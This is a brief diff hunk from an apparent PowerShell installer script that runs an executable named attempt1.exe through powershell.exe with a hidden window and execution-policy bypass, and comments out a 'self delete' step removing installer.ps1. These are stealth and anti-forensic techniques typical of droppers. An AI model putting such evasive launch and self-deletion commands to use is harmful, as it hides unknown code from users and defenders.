@@ -77,5 +77,5 @@ powershell powershell.exe -windowstyle hidden -ep bypass $path ./attempt1.exe
 
 # self delete
 cd $initial_dir
-del installer.ps1
+#del installer.ps1
 
